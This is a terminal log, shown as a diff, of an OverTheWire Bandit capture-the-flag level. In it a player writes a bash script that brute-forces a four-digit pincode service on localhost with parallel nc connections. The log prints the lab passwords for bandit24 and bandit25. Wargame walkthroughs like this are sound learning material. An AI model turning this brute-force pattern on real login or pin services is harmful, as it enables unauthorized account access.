@@ -1,0 +1,33 @@
+bandit24@melinda:~$ ls
+bandit24@melinda:~$ nc localhost 30002
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 1234
+Wrong! Please enter the correct pincode. Try again.
+2
+Fail! You did not supply enough data. Try again.
+^C
+bandit24@melinda:/tmp/mandmpt$ nano try.sh
+#!/bin/bash
+foo() {
+  echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $1" | nc localhost 30002 | egrep -v "Try again|Exiting|space."  >> result
+}
+
+for i in $(seq -f "%04g" 0 10000)
+do
+  echo $i
+  foo $i &
+done
+bandit24@melinda:/tmp/mandmpt$ chmod +x ./try.sh
+bandit24@melinda:/tmp/mandmpt$ ./try.sh 2>/dev/null
+0001
+0002
+....
+# ======== wait till the script finish ======== 
+
+bandit24@melinda:/tmp/mandmpt$ ls
+result  try.sh
+bandit24@melinda:/tmp/mandmpt$ cat result
+Correct!
+The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+bandit24@melinda:/tmp/mandmpt$
